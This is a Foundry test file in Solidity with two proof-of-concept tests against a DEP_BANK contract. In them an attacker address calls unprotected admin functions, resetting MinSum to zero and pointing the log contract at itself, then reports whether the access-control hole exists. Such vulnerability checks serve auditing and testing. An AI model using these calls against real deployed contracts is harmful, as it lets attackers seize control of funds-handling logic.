// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol";

contract DEP_BANKTest is Test {
    DEP_BANK private bank;
    LogFile private genuineLog;
    address private constant DEPLOYER = address(0x1);
    address private constant ATTACKER = address(0x666);
    uint256 private constant LOGFILE_SLOT = 6;

    function setUp() public {
        vm.prank(DEPLOYER);
        bank = new DEP_BANK();

        genuineLog = new LogFile();
    }

    function test_AttackerCanSetMinSum() public {
        console2.log("--- BEFORE-Trigger SetMinSum ---");
        uint256 minSumBefore = bank.MinSum();
        console2.log("Initial MinSum:", minSumBefore);

        console2.log("--- Trigger: Attacker sets MinSum to 0 ---");
        vm.prank(ATTACKER);
        bank.SetMinSum(0);

        console2.log("--- AFTER-Trigger SetMinSum ---");
        uint256 minSumAfter = bank.MinSum();
        console2.log("Current MinSum:", minSumAfter);

        if (minSumAfter == 0) {
            console2.log("Vulnerability Exists: Attacker successfully set MinSum to 0");
        } else {
            console2.log("Vulnerability not Exist: MinSum remains at %s", minSumAfter);
        }

        vm.prank(ATTACKER);
        bank.SetMinSum(10);
    }

    function test_AttackerCanSetMaliciousLog() public {
        console2.log("--- BEFORE-Trigger SetLogFile ---");
        bytes32 logSlotBefore = vm.load(address(bank), bytes32(LOGFILE_SLOT));
        address logBefore = address(uint160(uint256(logSlotBefore)));
        console2.log("Initial Log address:", logBefore);

        console2.log("--- Trigger: Attacker sets Log to attacker address ---");
        vm.prank(ATTACKER);
        bank.SetLogFile(address(ATTACKER));

        console2.log("--- AFTER-Trigger SetLogFile ---");
        bytes32 logSlotAfter = vm.load(address(bank), bytes32(LOGFILE_SLOT));
        address logAfter = address(uint160(uint256(logSlotAfter)));
        console2.log("Current Log address:", logAfter);

        if (logAfter == ATTACKER) {
            console2.log("Vulnerability Exists: Log address changed to attacker's address");
        } else {
            console2.log("Vulnerability not Exist: Log address remains %s", logAfter);
        }

        vm.prank(ATTACKER);
        bank.SetLogFile(address(0xDEAD));
    }
}